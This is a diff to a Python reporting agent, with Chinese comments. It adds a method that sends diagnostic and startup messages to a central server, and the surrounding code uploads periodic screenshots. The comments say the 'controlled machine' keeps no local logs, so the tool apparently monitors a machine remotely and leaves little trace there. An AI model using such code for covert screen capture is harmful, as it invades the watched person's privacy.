@@ -45,11 +45,31 @@ class Reporter:
                 print(f"  [!] {endpoint} -> {r.status_code}")
             except requests.exceptions.ConnectionError:
                 print(f"  [!] 连接失败 ({endpoint}), 重试 {i+1}/{RETRY_TIMES}")
+                if i == RETRY_TIMES - 1:
+                    self.diagnostic("network", "ERROR",
+                        f"连接失败 ({endpoint})，已重试{RETRY_TIMES}次仍失败")
             except Exception as e:
                 print(f"  [!] 异常: {e}")
+                self.diagnostic("system", "ERROR", f"上报异常 ({endpoint}): {e}")
             if i < RETRY_TIMES - 1:
                 time.sleep(RETRY_DELAY)
         return False
+
+    def diagnostic(self, category: str, level: str, message: str):
+        """上报诊断信息 — 被控机不写本地日志"""
+        try:
+            self.sess.post(
+                f"{self.url}/api/diagnostics",
+                json={
+                    "agent_name": self.agent,
+                    "category": category,
+                    "level": level,
+                    "message": message,
+                },
+                timeout=5
+            )
+        except Exception:
+            pass  # 诊断上报失败不应阻塞主流程
 
     def screenshot(self, data: dict):
         ok = self._post("screenshot", {
@@ -152,6 +172,7 @@ def main():
         "status": "online",
         "message": f"Agent started ({platform})",
     })
+    reporter.diagnostic("system", "INFO", f"Agent 启动 ({platform})")
 
     # 启动采集模块
     screenshot = ScreenCapture(interval=SCREENSHOT_INTERVAL)
